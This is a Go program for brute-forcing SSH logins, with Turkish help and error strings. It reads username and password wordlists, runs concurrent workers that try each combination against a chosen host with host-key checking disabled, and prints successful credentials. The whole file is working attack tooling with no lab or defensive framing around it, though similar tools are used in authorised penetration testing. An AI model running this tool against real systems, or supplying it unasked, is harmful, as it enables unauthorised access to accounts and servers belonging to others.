package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func trySSH(host, user, password string, wg *sync.WaitGroup) {
	defer wg.Done()

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	client, err := ssh.Dial("tcp", host+":22", config)
	if err != nil {
		fmt.Printf("[FAILED] Host: %s | User: %s | Password: %s\n", host, user, password)
		return
	}
	defer client.Close()

	fmt.Printf("[SUCCESS] Host: %s | User: %s | Password: %s\n", host, user, password)
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func main() {
	host := flag.String("h", "", "Hedef IP veya Hostname (ZORUNLU)")
	user := flag.String("u", "", "Tek bir kullanıcı adı belirtin")
	userFile := flag.String("U", "", "Kullanıcı adı wordlist dosyası belirtin")
	pass := flag.String("p", "", "Tek bir parola belirtin")
	passFile := flag.String("P", "", "Parola wordlist dosyası belirtin")
	workerCount := flag.Int("w", 5, "Worker sayısı (default: 5)")

	flag.Parse()

	if *host == "" {
		fmt.Println("Hata: -h (host) parametresi zorunludur.")
		flag.Usage()
		os.Exit(1)
	}

	if (*user == "" && *userFile == "") || (*pass == "" && *passFile == "") {
		fmt.Println("Hata: Kullanıcı adı (-u veya -U) ve parola (-p veya -P) belirtmek zorunludur.")
		flag.Usage()
		os.Exit(1)
	}

	var users []string
	var passwords []string

	if *user != "" {
		users = append(users, *user)
	} else {
		loadedUsers, err := readLines(*userFile)
		if err != nil {
			fmt.Printf("Kullanıcı dosyası okunamadı: %v\n", err)
			os.Exit(1)
		}
		users = loadedUsers
	}

	if *pass != "" {
		passwords = append(passwords, *pass)
	} else {
		loadedPasswords, err := readLines(*passFile)
		if err != nil {
			fmt.Printf("Parola dosyası okunamadı: %v\n", err)
			os.Exit(1)
		}
		passwords = loadedPasswords
	}

	var wg sync.WaitGroup
	workerChan := make(chan struct {
		User     string
		Password string
	}, *workerCount)

	for i := 0; i < *workerCount; i++ {
		go func() {
			for attempt := range workerChan {
				trySSH(*host, attempt.User, attempt.Password, &wg)
			}
		}()
	}

	for _, u := range users {
		for _, p := range passwords {
			wg.Add(1)
			workerChan <- struct {
				User     string
				Password string
			}{User: u, Password: p}
		}
	}

	close(workerChan)
	wg.Wait()
}
